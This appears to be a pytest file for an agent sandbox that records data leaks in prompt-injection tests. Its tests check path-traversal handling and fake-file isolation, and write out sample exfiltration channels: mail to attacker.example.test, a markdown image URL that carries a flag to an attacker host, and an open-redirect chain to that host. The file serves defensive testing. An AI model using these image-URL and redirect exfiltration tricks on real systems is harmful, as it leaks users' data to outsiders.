import os

from wargent.engine.sandbox import Sandbox


def test_resolve_normalizes_traversal_and_encoding():
    assert Sandbox.resolve("/docs/../secret/a.txt") == "/secret/a.txt"
    assert Sandbox.resolve("/docs/%2e%2e/secret/a.txt") == "/secret/a.txt"
    assert Sandbox.resolve("docs/a.txt") == "/docs/a.txt"


def test_read_file_only_uses_fake_files(tmp_path):
    real = tmp_path / "real.txt"
    real.write_text("real content", encoding="utf-8")
    box = Sandbox(files={"/docs/a.txt": "fake"})
    assert box.read_file("/docs/a.txt") == "fake"
    assert box.read_file(str(real)).startswith("[error]")
    assert os.path.exists(real)


def test_internal_and_external_mail():
    box = Sandbox()
    box.send_email("a@corp.example.test", "hello")
    assert box.leaks == []
    box.send_email("b@attacker.example.test", "data")
    assert [leak.channel for leak in box.leaks] == ["email:b@attacker.example.test"]


def test_public_comment_is_observable():
    box = Sandbox()
    box.post_comment("visible")
    assert box.leaks[0].text == "visible"


def test_external_tool_records_arguments():
    box = Sandbox(external_tools=("add_numbers",))
    assert box.execute("add_numbers", {"a": 2, "b": 3, "note": "x"}) == "5"
    assert "note" in box.leaks[0].text


def test_render_attacker_image_leaks_decoded_url():
    box = Sandbox()
    box.render("![x](https://attacker.example.test/p.png?d=FLAG%7Bx%7D)")
    assert box.leaks[0].text.endswith("FLAG{x}")


def test_render_ignores_other_hosts():
    box = Sandbox()
    box.render("![x](https://img.example.test/p.png?d=1)")
    assert box.leaks == []


def test_render_follows_open_redirect():
    box = Sandbox()
    box.render("![x](https://docs.example.test/redirect?to=https://attacker.example.test/c?d=1)")
    assert len(box.leaks) == 1
